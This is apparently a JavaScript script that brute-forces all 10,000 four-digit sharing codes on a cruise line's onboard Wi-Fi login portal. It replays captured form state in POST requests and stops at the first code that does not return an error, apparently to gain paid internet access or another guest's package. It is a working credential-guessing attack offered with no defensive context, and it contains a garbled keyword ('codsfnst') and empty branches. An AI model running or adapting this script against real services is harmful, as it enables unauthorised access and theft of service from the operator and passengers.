for (let i = 0; i <= 9999; i++) {
  const code = i.toString().padStart(4, "0");
  const response = await fetch(
    "https://onboardicafe.com/celebrity/defaultlogin.aspx?view=REGISTER",
    {
      headers: {
        accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        priority: "u=0, i",
        "sec-ch-ua":
          '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
      },
      referrer:
        "https://onboardicafe.com/celebrity/defaultlogin.aspx?view=REGISTER",
      body: `__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTIwODIzMjc2NzQPZBYCZg9kFgICAQ9kFgICAw9kFhpmD2QWBAIBDw8WAh4EVGV4dAUZQWN0aXZhdGUgSW50ZXJuZXQgcGFja2FnZWRkAgIPDxYCHwAFGVB1cmNoYXNlIEludGVybmV0IHBhY2thZ2VkZAIBD2QWAgIBDw8WAh8ABRBDb25uZWN0IHRvIFdpLUZpZGQCAg9kFgICAQ8PFgIfAAUQQ29ubmVjdCB0byBXaS1GaWRkAgMPDxYCHgdWaXNpYmxlaGQWFGYPFQIZUHVyY2hhc2UgSW50ZXJuZXQgcGFja2FnZRFBY3RpdmF0ZSBJbnRlcm5ldGQCAQ8WAh4LXyFJdGVtQ291bnQC%2F%2F%2F%2F%2Fw9kAgIPDxYCHwAFBkxvZyBpbmRkAgQPFgIfAgL%2F%2F%2F%2F%2FD2QCBQ8WAh8CAv%2F%2F%2F%2F8PZAIGDxYCHwIC%2F%2F%2F%2F%2Fw9kAgcPFgIfAgL%2F%2F%2F%2F%2FD2QCCA8WAh8CAv%2F%2F%2F%2F8PZAIJDw8WAh8ABRlQdXJjaGFzZSBJbnRlcm5ldCBwYWNrYWdlZGQCDA8PFgIfAAURUmVkZWVtIHByb21vIGNvZGVkZAIED2QWBmYPD2QWAh4LcGxhY2Vob2xkZXIFCFVzZXJuYW1lZAIBDw9kFgIfAwUM4peP4peP4peP4pePZAICDw8WAh8ABRJTaWduIGluIHRvIGNvbm5lY3RkZAIFDw8WAh8BZ2QWEGYPFQIFTU0vREQITU0vREQvWVlkAgEPD2QWAh8DBQQtLS0tZAIDDw9kFgIfAwUIMDA1MDE4MjNkAgYPD2QWAh8DBQhVc2VybmFtZWQCBw8PZBYEHwMFDOKXj%2BKXj%2BKXj%2BKXjx4FdGl0bGUFIFBsZWFzZSBjaG9vc2UgYSBmb3VyLW51bWJlciBQSU4uZAIIDw9kFgQfAwUM4peP4peP4peP4pePHwQFIFBsZWFzZSBjaG9vc2UgYSBmb3VyLW51bWJlciBQSU4uZAIJDw8WAh8ABRVDcmVhdGUgYSBXaUZpIEFjY291bnRkZAIKDw8WAh8ABQZDYW5jZWxkZAIHD2QWBGYPFQEURGV2aWNlIGxpbWl0IHJlYWNoZWRkAgEPDxYCHwAFDlN3aXRjaCBkZXZpY2VzZGQCCQ9kFgwCAQ8PFgIfAAUTRG93bmxvYWQgaW5jb21wbGV0ZWRkAgIPFQE6VG8gdHJ5IGFnYWluLCBwcm92aWRlIHlvdXIgZmlyc3QgbmFtZSBhbmQgbGFzdCBuYW1lIGJlbG93LmQCBA8VAQpGaXJzdCBuYW1lZAIGDxUBCUxhc3QgbmFtZWQCBw8PFgIfAAUETmV4dGRkAggPFQEKTm8sIHRoYW5rc2QCCg9kFgJmDxUCalZpc2l0IENlbGVicml0eSBpTG91bmdlIG9uIERlY2sgNiwgTWlkc2hpcC4gT3VyIHN0YWZmIHdpbGwgcmVzZXQgeW91ciBhY2NvdW50IHNvIHlvdSBjYW4gZG93bmxvYWQgb3VyIGFwcC4ERG9uZWQCDA9kFgRmDw8WAh8ABRNBZGQgc3RyZWFtaW5nIHZpZGVvZGQCAQ8PFgIfAAUXS2VlcCBteSBjdXJyZW50IHBhY2thZ2VkZAIND2QWBGYPDxYCHwAFFEFkZCBpbnRlcm5ldCBjYWxsaW5nZGQCAQ8PFgIfAAUXS2VlcCBteSBjdXJyZW50IHBhY2thZ2VkZAIOD2QWBmYPFgIfAgL%2F%2F%2F%2F%2FD2QCAQ8WAh8CAv%2F%2F%2F%2F8PZAICDw8WAh8ABRBQdXJjaGFzZSB1cGdyYWRlZGQCEA9kFghmDxUCE0Nvbm5lY3QgdGhpcyBkZXZpY2UQUHVyY2hhc2UgdXBncmFkZWQCAQ8WAh8CAv%2F%2F%2F%2F8PZAICDxYCHwIC%2F%2F%2F%2F%2Fw9kAgMPDxYCHwAFE0Nvbm5lY3QgdGhpcyBkZXZpY2VkZGSdzf5uYTwJ8R7Y7bJhoLEt2Ql0aowf9UMIUkwtiHENhg%3D%3D&__VIEWSTATEGENERATOR=47C8A89C&__EVENTVALIDATION=%2FwEdAAxKP7CI5SBJSnNVceFrqmkhHip8affYOPEmQy%2FOymtfD8CsK6afg7XArBXGBW2JfuvysHCzdQGpQXsnRgSV%2FxiVr7ZqPLRr4ClJcuv84wagk9UMRlGrMx1vSE1qDHI%2BNg8OfxxqOlWXqZNhYv%2BTUU%2BNte6xtP3wXMdsSgfNymvCfl6SeEZxSgqPiafcfz2NbjZo1ieok1quo8LwymWZwUodvbcThQP1qM5ToazOa%2FX2CLpMm9DYRA%2Bst4an1NIwMjGFduMClnmD1%2BMg9vvsK%2FkDQdic90KBgkyymVd1adjI0g%3D%3D&ctl00%24MainContent%24sharingcode=${code}&ctl00%24MainContent%24ButtonSharingCode=&ctl00%24MainContent%24folio=&ctl00%24MainContent%24dob=&ctl00%24MainContent%24register_username=&ctl00%24MainContent%24register_pin=&ctl00%24MainContent%24pin_re=&ctl00%24MainContent%24HiddenFieldLoginBooking=`,
      method: "POST",
      mode: "cors",
      credentials: "include",
    }
  );
  console.log(code);

  const statusRes = await fetch(
    "https://onboardicafe.com/celebrity/defaultlogin.aspx"
  );
  codsfnst statusBody = await statusRes.text();
  if (statusBody.includes("Basic")) {
  } else if (statusBody.includes("Premium")) {
  } else if (statusBody.includes("Sign in to connect")) {
  }

  const body = await response.text();
  if (body.includes("Something went wrong. Please try again.") === false) {
    break;
  }
}
